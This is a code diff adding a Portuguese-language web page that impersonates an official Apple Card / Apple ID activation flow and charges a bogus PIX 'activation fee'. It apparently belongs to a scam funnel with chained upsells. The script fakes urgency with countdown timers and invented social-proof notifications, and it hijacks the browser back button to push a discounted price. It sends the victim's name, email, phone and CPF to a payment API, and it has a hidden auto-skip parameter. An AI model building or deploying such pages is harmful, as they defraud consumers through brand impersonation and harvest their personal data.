+                <strong>Ativação obrigatória.</strong> Para baixar o aplicativo e gerenciar seu Apple Card, é necessário ativar sua conta Apple ID vinculada. Sem a ativação, o app permanecerá bloqueado.
+            </div>
+        </div>
+
+        <!-- Countdown -->
+        <div class="countdown-card">
+            <div>
+                <div class="cc-label">Tempo para ativação</div>
+                <div class="cc-title">Ative antes do vencimento</div>
+            </div>
+            <div class="cc-timer" id="mainTimer">09:59</div>
+        </div>
+
+        <!-- Features (locked) -->
+        <div class="features-card">
+            <div class="features-title">Funcionalidades da conta</div>
+
+            <div class="feature-row">
+                <div class="feature-icon-wrap blue"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"></path></svg></div>
+                <span class="feature-label">Apple Wallet — Cartão Virtual</span>
+                <span class="feature-badge locked">Bloqueado</span>
+            </div>
+            <div class="feature-row">
+                <div class="feature-icon-wrap blue"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"></path></svg></div>
+                <span class="feature-label">Apple Pay — NFC</span>
+                <span class="feature-badge locked">Bloqueado</span>
+            </div>
+            <div class="feature-row">
+                <div class="feature-icon-wrap green"><svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"></path></svg></div>
+                <span class="feature-label">Transferências PIX 24h</span>
+                <span class="feature-badge locked">Bloqueado</span>
+            </div>
+            <div class="feature-row">
+                <div class="feature-icon-wrap orange"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.41 16.09V20h-2.67v-1.93c-1.71-.36-3.16-1.46-3.27-3.4h1.96c.1 1.05.82 1.87 2.65 1.87 1.96 0 2.4-.98 2.4-1.59 0-.83-.44-1.61-2.67-2.14-2.48-.6-4.18-1.62-4.18-3.67 0-1.72 1.39-2.84 3.11-3.21V4h2.67v1.95c1.86.45 2.79 1.86 2.85 3.39H14.3c-.05-1.11-.64-1.87-2.22-1.87-1.5 0-2.4.68-2.4 1.64 0 .84.65 1.39 2.67 1.94s4.18 1.36 4.18 3.87c-.01 1.89-1.44 2.96-3.12 3.17z"></path></svg></div>
+                <span class="feature-label">Cashback 3% em compras</span>
+                <span class="feature-badge locked">Bloqueado</span>
+            </div>
+            <div class="feature-row">
+                <div class="feature-icon-wrap green"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"></path></svg></div>
+                <span class="feature-label">Suporte prioritário 24h</span>
+                <span class="feature-badge active">Ativo</span>
+            </div>
+        </div>
+
+        <!-- Guarantee -->
+        <div class="guarantee-card fade-in">
+            <div class="gc-icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path></svg></div>
+            <div class="gc-text"><strong>Ativação oficial Apple.</strong> Sua conta será ativada imediatamente após a confirmação do pagamento. O app ficará disponível para download na App Store vinculada ao seu Apple ID.</div>
+        </div>
+
+        <!-- Payment -->
+        <div class="pay-section">
+            <div class="pay-card">
+                <div class="pay-card-header">
+                    <span class="pch-title">Ativar Conta</span>
+                    <span class="pch-badge">PIX</span>
+                </div>
+                <div class="pay-card-price">
+                    <div class="pcp-value" id="payPriceDisplay">R$ 23,41</div>
+                    <div class="pcp-desc">Taxa de ativação · Pagamento instantâneo</div>
+                </div>
+                <button class="pay-btn" id="payBtn" onclick="generatePix()">
+                    <div class="shine"></div>
+                    <div class="pay-btn-label">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#1D1D1F"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg>
+                        <span>Ativar minha conta — <span id="payPrice">R$ 23,41</span></span>
+                    </div>
+                </button>
+                <div class="pay-security">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>
+                    Ambiente seguro · Criptografia de ponta a ponta
+                </div>
+            </div>
+        </div>
+
+        <!-- FAQ -->
+        <div class="faq">
+            <div class="faq-title">Perguntas frequentes</div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)">Por que preciso ativar a conta?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                <div class="faq-a"><p>A ativação é obrigatória para vincular seu Apple ID ao cartão. Sem ela, o app permanece bloqueado e você não conseguirá gerenciar seu Apple Card.</p></div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)">O que acontece após a ativação?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                <div class="faq-a"><p>Após a ativação, o app Apple Card ficará disponível para download. Você poderá acessar o cartão virtual, Apple Pay, transferências PIX e cashback.</p></div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)">E se eu não ativar agora?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                <div class="faq-a"><p>Sua conta será mantida em modo pendente por tempo limitado. Após o vencimento, será necessário realizar uma nova solicitação do cartão.</p></div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)">O pagamento é seguro?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                <div class="faq-a"><p>Sim. O pagamento é processado via PIX em ambiente seguro com criptografia de ponta a ponta. A confirmação e ativação são instantâneas.</p></div>
+            </div>
+        </div>
+
+        <!-- Decline removed -->
+    </div>
+
+    <!-- Fixed CTA -->
+    <div class="fixed-cta show" id="fixedCta">
+        <button onclick="generatePix()">Ativar Conta — <span id="fixedPrice">R$ 23,41</span></button>
+    </div>
+</div>
+
+<!-- Social Proof Toast -->
+<div class="social-proof" id="socialProof">
+    <div class="sp-dot"></div>
+    <div class="sp-text" id="spText"><strong>Maria S.</strong> de São Paulo ativou a conta agora</div>
+</div>
+
+<!-- PIX Modal -->
+<div class="pix-overlay" id="pixOverlay">
+    <div class="pix-modal">
+        <div class="pix-modal-handle"></div>
+        <div class="pix-modal-header">
+            <h3>Pagamento Pix</h3>
+            <button class="pix-modal-close" onclick="closePixModal()"><svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg></button>
+        </div>
+        <div class="pix-modal-body">
+            <div class="pix-timer-bar">
+                <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg>
+                <span class="ptb-text">O Pix expira em</span>
+                <span class="ptb-time" id="pixTimer">29:59</span>
+            </div>
+            <div class="pix-status" id="pixStatus">
+                <div class="ps-icon waiting" id="pixStatusIcon">
+                    <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg>
+                </div>
+                <div class="ps-title"><span class="pix-status-dot waiting" id="pixStatusDot"></span> <span id="pixStatusText">Aguardando pagamento...</span></div>
+                <div class="ps-desc" id="pixStatusDesc">Escaneie o QR Code ou copie o código</div>
+            </div>
+            <div class="qr-container fade-in">
+                <div class="qr-wrapper">
+                    <img id="pixQrImage" src="" alt="QR Code Pix">
+                    <div class="qr-apple-logo">
+                        <svg viewBox="0 0 24 24" fill="#1D1D1F"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg>
+                    </div>
+                </div>
+                <div class="qr-label">Escaneie com o app do seu banco</div>
+            </div>
+            <div class="copy-section fade-in">
+                <label>Pix Copia e Cola</label>
+                <div class="copy-box">
+                    <input type="text" class="copy-input" id="pixCopyPaste" readonly="" value="">
+                    <button class="copy-btn" id="copyBtn" onclick="copyPixCode()">Copiar</button>
+                </div>
+            </div>
+            <div class="pix-steps fade-in">
+                <div class="pix-steps-title">Como pagar:</div>
+                <div class="pix-step"><div class="pix-step-num">1</div><span>Abra o app do seu banco ou carteira digital</span></div>
+                <div class="pix-step"><div class="pix-step-num">2</div><span>Escolha pagar com Pix e escaneie o QR Code ou cole o código</span></div>
+                <div class="pix-step"><div class="pix-step-num">3</div><span>Confirme o pagamento. A ativação é instantânea!</span></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Back Redirect Modal -->
+<div class="br-overlay" id="brOverlay">
+    <div class="br-modal">
+        <div class="br-emoji">📱</div>
+        <div class="br-title">Espera!</div>
+        <div class="br-desc">Conseguimos uma <strong>taxa promocional</strong> para ativar sua conta agora e liberar o download do app.</div>
+        <div class="br-price" id="brPrice">R$ 9,90</div>
+        <button class="br-btn-accept" id="brAcceptBtn" onclick="acceptDiscount()">Ativar por R$ 9,90</button>
+        <button class="br-btn-decline" onclick="declineDiscount()">Não, obrigado</button>
+    </div>
+</div>
+
+<script>
+// CONFIG
+const UPSELL_ID = 2;
+const PRICE_CENTS = 2341;           // R$ 23,41
+const DISCOUNT_PRICE_CENTS = 990;   // R$ 9,90 (back-redirect)
+const PRODUCT_NAME = 'Ativacao de Conta';
+const NEXT_UPSELL = '../upp3-correios/index.html';
+const API_BASE = '../../api';
+
+let currentPrice = PRICE_CENTS;
+let currentTransactionId = null;
+let statusCheckInterval = null;
+let pixTimerInterval = null;
+let pixTimerSeconds = 30 * 60;
+
+// UTM + LEAD DATA
+const utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
+const params = new URLSearchParams(window.location.search);
+utmKeys.forEach(k => { const v = params.get(k); if(v) localStorage.setItem(k, v); });
+
+const LeadData = {
+    _key: 'applecard_lead',
+    load() { try { return JSON.parse(localStorage.getItem(this._key) || '{}') } catch { return {} } },
+    update(d) { const c = this.load(); const u = {...c, ...d, updated_at: Date.now()}; localStorage.setItem(this._key, JSON.stringify(u)); return u; }
+};
+
+const leadData = LeadData.load();
+const nome = params.get('nome') || leadData.nome || leadData.name || '';
+
+// Preencher limite dinâmico na screenshot da dashboard
+const limite = params.get('limite') || leadData.limite || '4750';
+const limiteNum = parseInt(limite) || 4750;
+const limiteFormatted = 'R$ ' + limiteNum.toLocaleString('pt-BR') + ',00';
+document.querySelectorAll('[data-limite]').forEach(el => { el.textContent = limiteFormatted; });
+
+// LOADING SCREEN (2s)
+const loadingMsgs = [
+    'Preparando sua conta...',
+    'Verificando Apple ID...',
+    'Conta localizada'
+];
+
+function runLoading() {
+    const bar = document.getElementById('loadingBar');
+    const msg = document.getElementById('loadingMsg');
+    const steps = [
+        { width: '35%', delay: 0 },
+        { width: '70%', delay: 700 },
+        { width: '100%', delay: 1400 }
+    ];
+    steps.forEach((step, i) => {
+        setTimeout(() => {
+            bar.style.width = step.width;
+            msg.textContent = loadingMsgs[i] || loadingMsgs[loadingMsgs.length - 1];
+        }, step.delay);
+    });
+    setTimeout(() => {
+        document.getElementById('loadingScreen').classList.add('hide');
+        document.getElementById('mainPage').style.display = '';
+        startMainTimer();
+        startSocialProof();
+        initScrollCta();
+        initBackRedirect();
+    }, 2200);
+}
+
+window.addEventListener('DOMContentLoaded', runLoading);
+
+// MAIN COUNTDOWN TIMER (10 min)
+let mainTimerSeconds = 10 * 60 - 1;
+
+function startMainTimer() {
+    updateMainTimer();
+    setInterval(() => {
+        if (mainTimerSeconds > 0) { mainTimerSeconds--; updateMainTimer(); }
+    }, 1000);
+}
+
+function updateMainTimer() {
+    const m = Math.floor(mainTimerSeconds / 60);
+    const s = mainTimerSeconds % 60;
+    document.getElementById('mainTimer').textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+}
+
+// SOCIAL PROOF
+const proofs = [
+    {name:'Maria S.',city:'São Paulo'},{name:'João P.',city:'Rio de Janeiro'},
+    {name:'Ana C.',city:'Belo Horizonte'},{name:'Carlos M.',city:'Curitiba'},
+    {name:'Fernanda L.',city:'Salvador'},{name:'Pedro R.',city:'Brasília'},
+    {name:'Juliana A.',city:'Recife'},{name:'Lucas D.',city:'Porto Alegre'},
+    {name:'Camila F.',city:'Fortaleza'},{name:'Rafael N.',city:'Goiânia'}
+];
+const spActions = ['ativou a conta agora','baixou o app há 1 min','liberou o Apple Card','ativou o Apple Pay agora'];
+let proofIdx = 0;
+
+function startSocialProof() {
+    setTimeout(() => showProof(), 4000);
+    setInterval(() => showProof(), 12000);
+}
+
+function showProof() {
+    const p = proofs[proofIdx % proofs.length];
+    const a = spActions[Math.floor(Math.random() * spActions.length)];
+    const el = document.getElementById('spText');
+    const toast = document.getElementById('socialProof');
+    el.innerHTML = `<strong>${p.name}</strong> de ${p.city} ${a}`;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 5000);
+    proofIdx++;
+}
+
+// FIXED CTA ON SCROLL
+function initScrollCta() {
+    const cta = document.getElementById('fixedCta');
+    window.addEventListener('scroll', () => {
+        cta.classList.add('show');
+    });
+}
+
+// FAQ
+function toggleFaq(el) {
+    const answer = el.nextElementSibling;
+    const isOpen = el.classList.contains('open');
+    document.querySelectorAll('.faq-q.open').forEach(q => {
+        q.classList.remove('open');
+        q.nextElementSibling.classList.remove('open');
+    });
+    if (!isOpen) { el.classList.add('open'); answer.classList.add('open'); }
+}
+
+// PIX GENERATION
+async function generatePix() {
+    const btn = document.getElementById('payBtn');
+    btn.classList.add('loading');
+    btn.disabled = true;
+
+    const utm = {};
+    utmKeys.forEach(k => { const v = localStorage.getItem(k); if (v) utm[k] = v; });
+
+    const ld = LeadData.load();
+    const payload = {
+        amount: currentPrice,
+        payerName: nome || ld.nome || ld.name || 'Cliente',
+        email: params.get('email') || ld.email || '',
+        phone: params.get('telefone') || ld.telefone || ld.phone || '',
+        document: params.get('cpf') || ld.cpf || ld.document || '',
+        productName: PRODUCT_NAME,
+        utm: utm
+    };
+
+    try {
+        const res = await fetch(`${API_BASE}/pix.php`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const result = await res.json();
+        if (result.success) {
+            currentTransactionId = result.transactionId;
+            LeadData.update({
+                upp0_transaction: result.transactionId,
+                upp0_amount: currentPrice,
+                upp0_timestamp: Date.now()
+            });
+            document.getElementById('pixQrImage').src = result.qrCodeImage || '';
+            document.getElementById('pixCopyPaste').value = result.pixCopyPaste || '';
+            openPixModal();
+            startStatusCheck();
+            startPixTimer();
+            // Track
+            if (window._tracker) window._tracker.trackEvent('upsell_pix_generated', JSON.stringify({upsell:'ativacao',price:currentPrice,grupo:ld.ab_upsell_grupo||''}));
+        } else {
+            alert('Erro ao gerar o Pix: ' + (result.error || 'Tente novamente'));
+        }
+    } catch (err) {
+        console.error('Erro:', err);
+        alert('Erro de conexão. Tente novamente.');
+    } finally {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+    }
+}
+
+// PIX MODAL
+function openPixModal() {
+    document.getElementById('pixOverlay').classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+
+function closePixModal() {
+    document.getElementById('pixOverlay').classList.remove('active');
+    document.body.style.overflow = '';
+}
+
+document.getElementById('pixOverlay').addEventListener('click', function(e) {
+    if (e.target === this) closePixModal();
+});
+
+function copyPixCode() {
+    const code = document.getElementById('pixCopyPaste').value;
+    if (!code) return;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(code).then(showCopied).catch(fallbackCopy);
+    } else { fallbackCopy(); }
+}
+
+function fallbackCopy() {
+    const input = document.getElementById('pixCopyPaste');
+    input.select(); input.setSelectionRange(0, 99999);
+    document.execCommand('copy'); showCopied();
+}
+
+function showCopied() {
+    const btn = document.getElementById('copyBtn');
+    btn.textContent = '✓ Copiado!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copiar'; btn.classList.remove('copied'); }, 3000);
+}
+
+function startPixTimer() {
+    pixTimerSeconds = 30 * 60;
+    if (pixTimerInterval) clearInterval(pixTimerInterval);
+    pixTimerInterval = setInterval(updatePixTimer, 1000);
+    updatePixTimer();
+}
+
+function updatePixTimer() {
+    const m = Math.floor(pixTimerSeconds / 60);
+    const s = pixTimerSeconds % 60;
+    document.getElementById('pixTimer').textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+    if (pixTimerSeconds > 0) pixTimerSeconds--;
+    else { document.getElementById('pixTimer').textContent = 'EXPIRADO'; clearInterval(pixTimerInterval); stopStatusCheck(); }
+}
+
+// STATUS POLLING
+function startStatusCheck() {
+    if (statusCheckInterval) clearInterval(statusCheckInterval);
+    statusCheckInterval = setInterval(checkPaymentStatus, 4000);
+    setTimeout(checkPaymentStatus, 3000);
+}
+
+function stopStatusCheck() {
+    if (statusCheckInterval) { clearInterval(statusCheckInterval); statusCheckInterval = null; }
+}
+
+async function checkPaymentStatus() {
+    if (!currentTransactionId) return;
+    try {
+        const res = await fetch(`${API_BASE}/status.php?id=${currentTransactionId}`);
+        const result = await res.json();
+        if (result.status === 'APPROVED') {
+            stopStatusCheck();
+            if (pixTimerInterval) clearInterval(pixTimerInterval);
+            showPaymentApproved();
+        }
+    } catch (err) { console.error('Erro status:', err); }
+}
+
+function showPaymentApproved() {
+    const statusIcon = document.getElementById('pixStatusIcon');
+    statusIcon.className = 'ps-icon paid';
+    statusIcon.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>';
+    document.getElementById('pixStatusDot').className = 'pix-status-dot paid';
+    document.getElementById('pixStatusText').textContent = 'Conta ativada com sucesso!';
+    document.getElementById('pixStatusDesc').textContent = 'Redirecionando...';
+    document.getElementById('pixStatus').style.background = 'rgba(52,199,89,.08)';
+
+    // Unlock app button visual
+    const appBtn = document.getElementById('appGetBtn');
+    appBtn.textContent = 'OBTER';
+    appBtn.classList.remove('locked');
+
+    LeadData.update({ upp0_paid: true, upp0_paid_at: Date.now() });
+    if (window._tracker) window._tracker.trackEvent('upsell_paid', JSON.stringify({upsell:'ativacao',price:currentPrice,grupo:LeadData.load().ab_upsell_grupo||''}));
+
+    setTimeout(() => {
+        window.location.href = buildUrl(getNextUpsell());
+    }, 2500);
+}
+
+// Determine next upsell based on AB group (read from LeadData or URL)
+function getNextUpsell() {
+    // Default: go to IOF
+    return params.get('next') || NEXT_UPSELL;
+}
+
+// BACK REDIRECT
+let brShown = false;
+
+function initBackRedirect() {
+    history.pushState(null, '', window.location.href);
+    window.addEventListener('popstate', () => {
+        history.pushState(null, '', window.location.href);
+        if (!brShown) showBackRedirect();
+    });
+}
+
+function handleBack() {
+    if (!brShown) showBackRedirect();
+    else goToNextUpsell();
+}
+
+function handleDecline() {
+    if (!brShown) showBackRedirect();
+    else goToNextUpsell();
+}
+
+function showBackRedirect() {
+    brShown = true;
+    document.getElementById('brOverlay').classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+
+function acceptDiscount() {
+    currentPrice = DISCOUNT_PRICE_CENTS;
+    const priceText = formatPrice(DISCOUNT_PRICE_CENTS);
+    document.getElementById('payPrice').textContent = priceText;
+    document.getElementById('payPriceDisplay').textContent = priceText;
+    document.getElementById('fixedPrice').textContent = priceText;
+    document.getElementById('brOverlay').classList.remove('active');
+    document.body.style.overflow = '';
+    document.querySelector('.pay-section').scrollIntoView({ behavior: 'smooth' });
+}
+
+function declineDiscount() {
+    document.getElementById('brOverlay').classList.remove('active');
+    document.body.style.overflow = '';
+    goToNextUpsell();
+}
+
+// NAVIGATION
+function buildUrl(base, extra = {}) {
+    const u = new URL(base, window.location.href);
+    new URLSearchParams(window.location.search).forEach((v, k) => u.searchParams.set(k, v));
+    Object.entries(extra).forEach(([k, v]) => { if (v) u.searchParams.set(k, v); });
+    return u.toString();
+}
+
+function goToNextUpsell() {
+    if (window._tracker) window._tracker.trackEvent('upsell_declined', JSON.stringify({upsell:'ativacao',grupo:LeadData.load().ab_upsell_grupo||''}));
+    window.location.href = buildUrl(getNextUpsell());
+}
+
+function formatPrice(cents) {
+    return 'R$ ' + (cents / 100).toFixed(2).replace('.', ',');
+}
+
+// COOKIE (mark visited)
+function setCookie(name, value, days) {
+    const d = new Date();
+    d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+    document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/`;
+}
+setCookie('apple_upp_0', 'visited', 30);
+
+// Track view
+if (window._tracker) window._tracker.trackEvent('upsell_view', JSON.stringify({upsell:'ativacao',grupo:LeadData.load().ab_upsell_grupo||''}));
+
+// Auto-skip mode
+if(params.get('mac')==='apple'){setTimeout(()=>{window.location.href=buildUrl(getNextUpsell());},2000);}
+
+</script>
+
+
+</body></html>
